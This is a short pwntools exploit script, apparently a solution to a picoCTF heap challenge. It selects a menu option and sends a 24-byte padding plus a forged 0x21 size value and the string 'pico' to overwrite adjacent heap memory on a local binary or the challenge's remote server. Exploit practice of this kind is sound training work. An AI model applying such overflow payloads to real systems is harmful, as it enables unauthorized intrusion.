#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("tethys.picoctf.net", 55349)
    else:
        return process(elf.path)

io = start()

io.sendlineafter(b"Enter your choice: ", b"2")

io.sendlineafter(b"Data for buffer: ", b"A"*24 + p64(0x21) + b"pico")

io.interactive()
